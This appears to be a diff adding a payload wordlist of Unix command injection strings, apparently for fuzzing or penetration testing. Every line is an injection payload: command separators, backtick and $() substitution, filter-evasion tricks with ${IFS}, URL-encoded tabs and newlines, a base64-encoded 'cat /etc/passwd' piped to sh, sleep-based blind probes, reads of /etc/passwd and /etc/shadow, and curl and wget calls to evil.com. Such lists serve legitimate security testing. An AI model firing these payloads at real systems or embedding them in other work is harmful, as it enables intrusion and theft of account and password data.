@@ -1,0 +1,73 @@
+# Unix Command Injection Payloads
+;id
+;id;
+|id
+|id|
+||id
+||id||
+`id`
+$(id)
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;ls -la
+|ls -la
+`ls -la`
+$(ls -la)
+;uname -a
+|uname -a
+$(uname -a)
+`uname -a`
+;whoami
+|whoami
+$(whoami)
+`whoami`
+;ifconfig
+;ip addr
+$(ifconfig)
+;cat /etc/shadow
+;curl http://evil.com
+$(curl http://evil.com)
+`curl http://evil.com`
+;wget http://evil.com
+$(wget http://evil.com)
+;ping -c 1 127.0.0.1
+$(ping -c 1 127.0.0.1)
+;echo ${IFS}test
+cat${IFS}/etc/passwd
+;echo${IFS}vulnerable
+;$(echo${IFS}id)
+;{cat,/etc/passwd}
+;cat</etc/passwd
+;cat$IFS/etc/passwd
+;cat%09/etc/passwd
+;cat%20/etc/passwd
+cat${IFS}${IFS}/etc/passwd
+;bash -c 'cat /etc/passwd'
+;sh -c 'id'
+;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
+;echo${IFS}$(id)
+;printf 'id'|sh
+;eval 'id'
+;exec id
+& id
+&& id
+%0aid
+%0did
+%0a%0did
+\nid
+\rid
+\r\nid
+;sleep${IFS}5
+|sleep${IFS}5
+`sleep 5`
+$(sleep 5)
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+;sleep 5
+|sleep 5
+$(sleep 5)
+`sleep 5`
+;echo vulnerable > /tmp/test
+;touch /tmp/test
